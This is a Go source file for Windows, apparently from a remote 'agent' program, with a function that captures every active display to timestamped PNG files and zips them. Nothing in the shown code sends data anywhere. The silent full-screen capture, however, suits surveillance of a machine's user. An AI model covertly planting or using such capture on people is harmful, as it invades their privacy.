//go:build windows
// +build windows

package agent

import (
	"fmt"
	"image/png"
	"log"
	"os"
	"strconv"
	"time"

	"github.com/kbinani/screenshot"
	"github.com/mholt/archiver/v3"
)

// Screenshot take a screenshot
// returns path of taken screenshot
func Screenshot() (path string, err error) {
	n := screenshot.NumActiveDisplays()
	var pics []string
	if n <= 0 {
		err = fmt.Errorf("%d displays detected, aborting", n)
		log.Printf("Zero displays: %v", err)
		return
	}
	log.Printf("Taking screenshot of %d displays", n)

	now := time.Now()
	timedate := fmt.Sprintf("%d-%02d-%02d_%02d-%02d-%02d",
		now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, e := screenshot.CaptureRect(bounds)
		if e != nil {
			err = e
			log.Printf("CaptureRect: %v", err)
			return
		}
		path = fmt.Sprintf("%s-%d_%dx%d.png", timedate, i, bounds.Dx(), bounds.Dy())
		picfile, e := os.Create(path)
		if e != nil {
			err = fmt.Errorf("create %s: %v", path, e)
			log.Printf("Create picfile: %v", err)
			return
		}
		log.Printf("Taken screenshot %s", strconv.Quote(path))
		defer picfile.Close()
		err = png.Encode(picfile, img)
		if err != nil {
			err = fmt.Errorf("PNG encode: %v", err)
			log.Printf("PNG encode: %v", err)
			return
		}
		pics = append(pics, path)
	}

	// if we get more than one pictures
	// pack them into one zip archive
	if len(pics) > 1 {
		path = timedate + ".zip"
		err = archiver.Archive(pics, path)
		if err != nil {
			err = fmt.Errorf("Making archive: %v", err)
			log.Printf("Making archive: %v", err)
			return
		}
	}

	return
}
